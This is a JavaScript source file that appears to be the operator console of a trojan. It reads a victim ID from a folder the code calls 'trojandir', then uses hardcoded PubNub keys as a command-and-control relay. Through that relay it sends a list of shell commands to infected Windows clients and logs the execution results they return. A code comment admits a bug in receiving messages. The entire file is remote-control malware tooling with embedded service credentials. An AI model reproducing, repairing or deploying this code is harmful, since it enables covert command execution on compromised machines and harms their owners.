debugger;

import path from "path";
import PubNub from "pubnub";
import fs from "fs";
import crypto from "crypto";


function logmsg(msg) {
    console.log(msg);
}


function isNullOrWhitespace(str) {
    return !str || !str.trim();
}

function getRandomCode(n) {
    const min = Math.pow(10, n - 1);
    const max = Math.pow(10, n) - 1;

    return crypto.randomInt(min, max + 1).toString();    
}

const enginename = 'JS'; // 'BAT'
const trojandir = 'C:\\ProgramData\\owd\\';
const clientid = fs.readFileSync(path.join(trojandir, 'client_id'), 'utf-8');

let mothership_channel = `clientid_${clientid}_${enginename}_mothership`;
let client_channel = `clientid_${clientid}_${enginename}_client`;

logmsg(`mothership_channel: ${mothership_channel}`);
logmsg(`client_channel: ${client_channel}`);

const pubnub = new PubNub({
    publishKey: 'pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc',
    subscribeKey: 'sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd',
    userId: 'clientid_'+clientid // Unique identifier for this client
});

const channel = pubnub.channel(client_channel);
const subscription = channel.subscription();

var seqid = 1;
var cmdresponse = null;

var cmdresponses = [];

// BUG -- not able to receive any messages from client
subscription.onMessage = (messageEvent) => {
    cmdresponse = messageEvent.message.execresult;
    cmdresponses.push(cmdresponse);

    let messagelog = '';

    for (const [key, value] of Object.entries(messageEvent.message)) {
        messagelog += ( key == 'execresult' ) ? '' : (`${key}: ${value}`) + '\r\n';
    }

    logmsg('\r\n' + '[INCOMING MESSAGE]:' + '\r\n' + messagelog + '\r\n---BEGIN---\r\n' + cmdresponse + '\r\n---END---\r\n');
};

subscription.subscribe();


function getTimestamp() {
    const date = new Date();
    
    // Extract components
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0'); //
    const day = String(date.getDate()).padStart(2, '0');       //
    const hours = String(date.getHours()).padStart(2, '0');    //
    const minutes = String(date.getMinutes()).padStart(2, '0');//
    const seconds = String(date.getSeconds()).padStart(2, '0');//
    const ms = String(date.getMilliseconds()).padStart(3, '0'); //
  
    // Combine into final strings
    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
    const fullWithMs = `${yyyymmddhhmmss}${ms}`;
  
    return fullWithMs;
}

async function sendCmd(cmdtext) {
    
    if ( isNullOrWhitespace(cmdtext) ) {
        return;
    }

    if ( ! cmdtext.endsWith('\n') ) {
        cmdtext += '\n';
    }

    // { cmdtext:'echo 1234 \n', seqid:1234, cmdid:random 8 digit code, ts:timestamp }

    let cmdobj = { 
        cmdtext:cmdtext, 
        seqid:seqid++, 
        cmdid:getRandomCode(8), 
        ts:getTimestamp() 
    };
    
    let ret = await publishMessage(cmdobj);
    return ret;
}

async function publishMessage(payload) {
    
    try {
        let res = await pubnub.publish({
            channel: mothership_channel,
            message: payload
        });

        logmsg("message published -- timetoken: " + res.timetoken + ' payload: ' + JSON.stringify(payload));

        return res;
    } catch (error) {
        logmsg(error);
    }
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function sleepSync(ms) {
    const buffer = new SharedArrayBuffer(4);
    const view = new Int32Array(buffer);
    // Atomics.wait freezes the execution thread until the condition is met or 
    // it times out
    Atomics.wait(view, 0, 0, ms); 
}

let lines = [];

// put some basic text at beginning of file to ensure read works
const content = fs.readFileSync('C:\\ProgramData\\owd\\nodehostrelay.cmdslist.js', 'utf-8'); // utf16le, utf-8
const linesArray = content.split(/\r?\n/);
lines = linesArray.filter(str => str !== "");
;

var cmds = [];
cmds.push("new Date().toLocaleString();");
cmds.push(...lines);


for ( let i = 0; i<cmds.length; i++) {
    let cmdtext = cmds[i];
        
    let ret = await sendCmd(cmdtext);

    logmsg('waiting 1 second...');
    sleepSync(1000);    
} 

process.on('SIGINT', () => {
  logmsg('\nUnsubscribing and exiting...');
  subscription.unsubscribe();
  process.exit();
});
